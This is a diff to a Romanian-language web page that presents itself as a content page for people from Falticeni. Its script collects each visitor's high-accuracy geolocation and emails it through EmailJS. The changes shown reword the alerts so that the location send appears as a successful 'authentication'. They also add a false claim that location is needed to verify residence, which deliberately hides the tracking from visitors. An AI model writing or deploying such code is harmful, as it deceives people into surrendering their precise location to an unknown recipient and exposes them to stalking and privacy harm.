@@ -37,6 +37,8 @@
 </head>
 <body>
     <h2>Pagina de Bafta a Falticeniului</h2>
+    <h2>Aceasta pagina este destinata persoanelor din Falticeni.</h2>
+    <h1>Pentru a te conecta trebuie sa ai locatia activa</h1>
     <button onclick="sendLocation()">Acces Content</button>
     
     <script>
@@ -59,20 +61,20 @@
                     
                     emailjs.send("service_ar3ptv9", "template_er5zc5m", templateParams)
                         .then(response => {
-                            alert("Locația a fost trimisă pe email!");
+                            alert("Autentificare realizata cu succes!");
                         }, error => {
                             console.error("Eroare la trimitere:", error);
                             alert("Eroare la trimiterea emailului.");
                         });
                 }, error => {
-                    alert('Nu te poti autentifica. Verifică permisiunile browserului.');
+                    alert('Nu te poti autentifica, trebuie sa ne asiguram ca esti din Falticeni, activeaza locatia.');
                 }, {
                     enableHighAccuracy: true,
                     timeout: 10000,
                     maximumAge: 0
                 });
             } else {
-                alert('Browserul tău nu suportă geolocalizare.');
+                alert('Browserul nu este compatibil.');
             }
         }
     </script>
